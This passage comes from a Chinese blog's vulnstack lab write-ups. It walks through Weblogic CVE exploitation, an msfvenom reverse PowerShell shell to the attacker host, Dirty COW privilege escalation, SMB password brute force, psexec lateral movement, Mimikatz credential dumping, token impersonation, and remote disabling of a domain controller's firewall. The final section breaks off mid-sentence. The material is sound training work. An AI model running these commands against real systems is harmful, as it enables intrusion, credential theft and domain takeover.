class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin<br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span><br>systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Bus</span> <span class="hljs-title class_">Proxy</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">108</span>::/home/<span class="hljs-symbol">syslog:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/<span class="hljs-symbol">nonexistent:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">lxd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/var/lib/lxd/<span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span>::/var/run/<span class="hljs-symbol">dbus:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span>::/run/<span class="hljs-symbol">uuidd:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">yy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:yy</span>,,,<span class="hljs-symbol">:/home/yy</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/var/run/<span class="hljs-symbol">sshd:</span>/usr/sbin/nologin<br><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">117</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">www:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span>::/home/<span class="hljs-symbol">www:</span>/sbin/nologin<br><br><br>/etc/mysql/mysql.conf.d/<span class="hljs-symbol">mysqld.cnf:</span><br><br>[mysqld_safe]<br>socket= /var/run/mysqld/mysqld.sock<br>nice= <span class="hljs-number">0</span><br><br>[mysqld]<br>user= mysql<br>pid-file= /var/run/mysqld/mysqld.pid<br>socket= /var/run/mysqld/mysqld.sock<br>port= <span class="hljs-number">3306</span><br>basedir= /usr<br>datadir= /var/lib/mysql<br>tmpdir= /tmp<br>lc-messages-dir= /usr/share/mysql<br>log_error = /var/log/mysql/error.log<br><br><br>/usr/share/mysql/<span class="hljs-symbol">debian_create_root_user.sql:</span><br><br><span class="hljs-title class_">INSERT</span> <span class="hljs-title class_">INTO</span> tmp_user <span class="hljs-title class_">VALUES</span> (<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>);<br></code></pre></td></tr></table></figure><p>实在找不到有用的信息了，去看攻略发现 <code>/tmp</code> 目录下有个 <code>mysql</code> 文件夹… 我没有啊！我没有！！</p><p>假装我有吧，反正前面也找过这个地方，假装找到的账号密码 <code>wwwuser/wwwuser_123Aqx</code> 好耶(好个屁)</p><p>直接ssh连接 <code>WEB</code> 靶机<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161456340.png" alt="image-20231209161456340"></p><h5 id="提权WEB"><a href="#提权WEB" class="headerlink" title="提权WEB"></a>提权WEB</h5><p>这次没错了，<code>ip a</code> 查看网卡，确实是 <code>WEB</code> 靶机，cat一下 <code>/etc/nginx/nginx.conf</code>，果然做了转发，老贼<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161756516.png" alt="image-20231209161756516"></p><p>反弹shell到msf，上传一个 <code>linpeas</code> ，查看提权信息<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209171110248.png" alt="image-20231209171110248"></p><p>sudo无法执行，suid也没有可用，尝试用脏牛内核提权</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># kali</span><br>searchsploit -m <span class="hljs-number">40611</span><br>gcc -pthread <span class="hljs-number">40611.</span>c<br>将生成的a.<span class="hljs-keyword">out</span>上传到靶机并运行时发现glibc版本不对，静态编译重新上传：<br>gcc -pthread <span class="hljs-number">40839.</span>c -lcrypt --<span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><p>提权成功，新建了一个 <code>firefart</code> 用户，替代了root</p><h3 id="内网-1"><a href="#内网-1" class="headerlink" title="内网"></a>内网</h3><p>现在拿到了 <code>WEB</code> 的root权限和 <code>WEB1</code> 的临时用户权限，上传一个fscan进行内网扫描</p><h4 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span> -h <span class="hljs-number">192.168.93.1</span>-<span class="hljs-number">255</span> -br <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209194319511.png" alt="image-20231209194319511"></p><p>新发现了三个ip：10，20，30，三个ip均开放了 <code>135,139，445</code> 且 10 开放 88 端口，20 开放 1433 端口</p><p>在msf上添加一个路由并添加代理，将nmap带入内网(也可以上传nmap到 WEB 服务器，毕竟已经是我的玩物了)</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata"># msf <span class="hljs-keyword">shell</span>-&gt;meterpreter_shell<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manager/shell_to_meterpreter<br><br># meterpreter 添加路由<br><span class="hljs-keyword">run</span> autoroute -s 192.168.93.0/24<br><br><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvhost 127.0.0.1<br>修改 /etc/proxychains.<span class="hljs-keyword">conf</span><br><br># kali<br>proxychains nmap -Pn -<span class="hljs-keyword">sT</span> 192.168.93.10    # Pn 不执行ping操作  <span class="hljs-keyword">sT</span>完整的三次握手<br></code></pre></td></tr></table></figure><p>这里不清楚什么原因，反正我的nmap带进内网后也扫不到东西，给<code>WEB</code>上传一个nmap,nmap安装需要python3.x，所以我们又给他装了个python，这里又踩了个坑，make的时候要求系统时间晚于python安装包的时间，否则会卡进死循环，所以还要利用 yum 安装 <code>ntpdate</code> … 真是一环套一环啊，最后也没安成功，老老实实换了个旧版本(python2就能用的)，所以我辛苦装python3图个啥…</p><p>安装完成，启动！</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># WEB靶机</span><br><span class="hljs-attribute">nmap</span> --script=vuln <span class="hljs-number">192.168.93.10</span>-<span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>然而一个洞都没有…好啊…所以我费尽心思地装一个nmap有什么用…自闭ing</p><h4 id="奇淫巧计"><a href="#奇淫巧计" class="headerlink" title="奇淫巧计"></a>奇淫巧计</h4><p>这时候去翻别人的wp，有两种方案，第一是钓鱼…对，自己建一个钓鱼网站，自己登进去靶机装作受害人把自己的账号密码输进去…也行吧</p><p>另一种方法就是爆破。。。靶机开启了smb服务，利用msf的smb_login模块，默认账户名 <code>administrator</code> 密码字典这里用 <code>rockyou.txt</code> 当然这里面没有这个密码… 为了题目能继续下去，我手动添加了密码 <code>123qwe!ASD</code> 开跑！</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"># msf(已经建立好路由)<br>use auxiliary/scanner/smb/smb_login<br>show <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> smbuser <span class="hljs-comment">administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">pass_file</span> /usr/<span class="hljs-comment">share</span>/wordlists/<span class="hljs-comment">rockyou.txt</span><br>run<br></code></pre></td></tr></table></figure><p>速度太慢了，直接假装我们已经拿到了密码(实际中浪费这么久基本可以放弃了)，现在用msf连到 30 这台靶机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 192.168.93.30<br><span class="hljs-built_in">set</span> smbuser administrator<br><span class="hljs-built_in">set</span> smbpass 123qwe!ASD <br>run<br></code></pre></td></tr></table></figure><p>拿到了 30(win7) 的 <code>meterpreter_shell</code> 但是进程里并没有域控 <code>test</code> 的进程，因此导入 <code>kiwi</code> 包也只能加载出加密后的 域管理员密码<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211171200038.png" alt="image-20231211171200038"></p><p>我们尝试用同样的账号密码连接 20 靶机，成功进入，再次ps，发现 <code>TEST</code> 用户的进程，migrate 过去，利用kiwi抓取密码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># meterpreter</span><br>load kiwi<br>kiwi_cmd sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>okk<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211172039008.png" alt="image-20231211172039008"></p><h4 id="拿DC"><a href="#拿DC" class="headerlink" title="拿DC"></a>拿DC</h4><p>现在我们拿到了域管理员的账号密码，利用msf的smb登录程序，尝试登录 DC(10靶机)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 192.168.93.10<br><span class="hljs-built_in">set</span> smbuser administrator<br><span class="hljs-built_in">set</span> smbpass zxcASDqw123!!<br><span class="hljs-built_in">set</span> SMBDomain TEST.ORG<br>run<br></code></pre></td></tr></table></figure><p>失败了…<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211173803876.png" alt="image-20231211173803876"></p><p>经过一番查找学习，我了解到又一个新知识 <strong>msf令牌窃取</strong> </p><p>参考资料 <a href="https://www.freebuf.com/articles/web/284135.html">msf令牌窃取 - FreeBuf网络安全行业门户</a></p><p>我们先回到登录了 20 靶机的 session</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-keyword">use</span> incognito      <span class="hljs-comment"># 进入隐身模式(否则以下命令无法执行) </span><br>list_tokens -u     <span class="hljs-comment"># 列出可用令牌</span><br>impersonate_token <span class="hljs-string">&quot;TEST\adminitrator&quot;</span>  <span class="hljs-comment"># 窃取TEST域的管理员令牌</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211180553265.png" alt="image-20231211180553265"></p><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211180648001.png" alt="image-20231211180648001"></p><p>这里有个注意点，必须要域管理员登陆了 20 靶机，我们才能成功窃取到令牌，我的机子重启后并没有登录，所以就没能窃取到，需要手动登陆一下域管理员账号，这一点从进程列表里也能看到，当不存在TEST域的进程时，也就没有相应的令牌</p><p>窃取到后，我们当前的用户就是 <code>TEST\administrator</code> ，进入shell，关闭防火墙</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># shell</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> start unablefirewall<br></code></pre></td></tr></table></figure><p>登录 10 靶机可以看到防火墙已被关闭<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211181119630.png" alt="image-20231211181119630"></p><p>再次尝试之前的smb登录，成功<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211181242145.png" alt="image-20231211181242145"></p><p>最后在管理员的文档里找到flag<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231211181326428.png" alt="image-20231211181326428"></p>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>学习</tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack靶场日记-2</title>
    <link href="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/"/>
    <url>/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="靶场二"><a href="#靶场二" class="headerlink" title="靶场二"></a>靶场二</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode">攻击机：<br>    kali<br>靶机：<br>    DC  Wi<span class="hljs-symbol">n2012</span><span class="hljs-comment">(64)</span><br>    PC  wi<span class="hljs-symbol">n7</span><span class="hljs-comment">(32)</span><br>    WEB wi<span class="hljs-symbol">nServer2008</span> R<span class="hljs-number">2</span><span class="hljs-comment">(64)</span><br></code></pre></td></tr></table></figure><ol><li><p>靶机密码均为 <code>1qaz@WSX</code> ，其中WEB登不进，需要切换用户，直接 <code>de1ay/1qaz@WSX</code> 登录，不要用 <code>WEB域</code></p></li><li><p>需要手动开启WEB服务(上来直接扫漏洞无功而返就是没人告诉我要开服务…)，在 <code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code> 下有一个 <code>startWeblogic</code> 的批处理，管理员身份运行它，管理员账号密码：<code>Administrator/1qaz@WSX</code> (注意大小写)</p></li><li><p>如果点了之后黑框闪一下就没，说明用的是普通用户权限，右键管理员运行</p></li></ol><h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><p>靶机的ip有两个网段 <code>192.168.111.0/24</code>  和 <code>10.10.10.0/24</code> (注意顺序)，我们新开一个网卡VMnet3，配置为仅主机模式，网段为 <code>192.168.111.0/24</code> ，同时VM默认的仅主机模式网卡为 VMnet1，将VMnet3添加给kali和两个具有公网ip(192.168.111.xxx)的靶机</p><h5 id="外网-VMnet3"><a href="#外网-VMnet3" class="headerlink" title="外网(VMnet3)"></a>外网(VMnet3)</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> <span class="hljs-number">192.168.111.128</span><br>PC   <span class="hljs-number">192.168.111.201</span><br>WEB  <span class="hljs-number">192.168.111.80</span><br></code></pre></td></tr></table></figure><h5 id="内网-仅主机模式-VMnet1"><a href="#内网-仅主机模式-VMnet1" class="headerlink" title="内网(仅主机模式 - VMnet1)"></a>内网(仅主机模式 - VMnet1)</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">DC</span>  <span class="hljs-number">10.10.10.10</span><br>PC  <span class="hljs-number">10.10.10.201</span><br>WEB <span class="hljs-number">10.10.10.80</span><br></code></pre></td></tr></table></figure><h5 id="连通性"><a href="#连通性" class="headerlink" title="连通性"></a>连通性</h5><p>PC 和 WEB 两台机子上有防火墙，所有机子都ping不同这两台</p><p>内网都可以ping通 DC</p><p>外网都可以ping通 kali</p><h4 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h4><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><p>nmap发现ip和开放端口</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap <span class="hljs-number">192.168.111.0</span>/<span class="hljs-number">24</span><br>nmap -<span class="hljs-keyword">A</span> -sS -sV -p- <span class="hljs-number">192.168.111.201</span><br>nmap -<span class="hljs-keyword">A</span> -sS -sV -p- <span class="hljs-number">192.168.111.80</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204111818397.png" alt="image-20231204111818397"></p><h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>利用nmap的漏扫插件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap <span class="hljs-attribute">--script</span>=vuln 192.168.111.80<br><span class="hljs-comment"># 发现永恒之蓝，利用失败</span><br><br>nmap <span class="hljs-attribute">--script</span>=vuln 192.168.111.201<br><span class="hljs-comment"># 同样有永恒之蓝，利用失败，猜测是开启了防火墙</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204104109229.png" alt="image-20231204104109229"></p><p>回到上一步，WEB服务器开了7001 <code>weblogic</code> 服务(废话，我亲手开的)，看看有没有漏洞可利用，这里使用 <a href="https://github.com/0xn0ne/weblogicScanner">0xn0ne&#x2F;weblogicScanner</a> 和 <a href="https://github.com/KimJun1010/WeblogicTool">KimJun1010&#x2F;WeblogicTool</a> ，前者用于探测，后者用于验证</p><p>扫描结果<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144913536.png" alt="image-20231204144913536"></p><p>检测结果<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144934193.png" alt="image-20231204144934193"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145042455.png" alt="image-20231204145042455"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145927252.png" alt="image-20231204145927252"></p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><code>cve_2016_0638</code> 和 <code>cve_2016_3510</code> 都可用来命令执行，弹个shell先</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kali</span><br>msfvenom -p cmd/windows/reverse_powershell <span class="hljs-attribute">LHOST</span>=192.168.111.128 <span class="hljs-attribute">LPORT</span>=4444<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload cmd/windows/reverse_powershell<br><span class="hljs-built_in">set</span> LHOST 192.168.111.128<br>run<br></code></pre></td></tr></table></figure><p>将生成的payload在工具命令框执行，拿到cmdshell，顺手看一眼systeminfo<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160314050.png" alt="image-20231204160314050"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204170125566.png" alt="image-20231204170125566"></p><p>① 可以拿去提权辅助工具搜漏洞</p><p>② 发现内网地址</p><h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>先把shell转为meterpreter_shell</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># shell</span><br>[ctrl + z] 当前会话挂后台<br><br><span class="hljs-comment"># msf</span><br>sessions 查看会话<span class="hljs-built_in">id</span><br>use post/multi/manage/shell_to_meterpreter<br><span class="hljs-keyword">set</span> session <span class="hljs-number">3</span>(shell的会话<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">run</span><br>sessions 查看会话<span class="hljs-built_in">id</span><br>sessions -i <span class="hljs-number">4</span>(新的会话<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment"># meterpreter</span><br>getsystem<br>提权成功<br>ps<br>migrate 迁移到一个稳定的进程<br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160842752.png" alt="image-20231204160842752"></p><h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p>做个cs的马子，上传-&gt;隐藏-&gt;计划任务 一条龙，上线cs</p><p>域控里出场率很高的一个词叫 